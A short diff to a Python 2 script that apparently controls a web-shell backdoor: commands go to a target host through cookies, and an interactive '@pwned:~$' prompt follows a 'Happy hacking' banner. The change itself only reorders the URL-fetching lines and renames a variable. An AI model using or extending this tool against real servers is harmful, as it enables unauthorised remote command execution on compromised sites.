@@ -77,16 +77,18 @@ def backcookie(command, host, cookie, vcmd):
 
 def shell(host, cookie):
 	backcookie("cd",host,cookie,"")
-	openurl = urllib.urlopen(host)
-	server = openurl.headers.get("server")
-	domain = host.split("/")[2]
+	
 	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
 	print "\t\t+    Developed by: @mrjopino      +"
 	print "\t\t+             To play             +"
 	print "\t\t-----------------------------------\n\n"
 	print color.green + "[+] " + color.blue  + "Happy hacking" + color.white
 	print color.green + "[+] " + color.blue  + "Sometimes it is not positive, but sometimes if!\n" + color.white
-	
+
+	opu = urllib.urlopen(host) # opu > openurl
+	server = opu.headers.get("server")
+	domain = host.split("/")[2]
+
 	while True:
 
 		command = raw_input("@" + "pwned:~$ ")
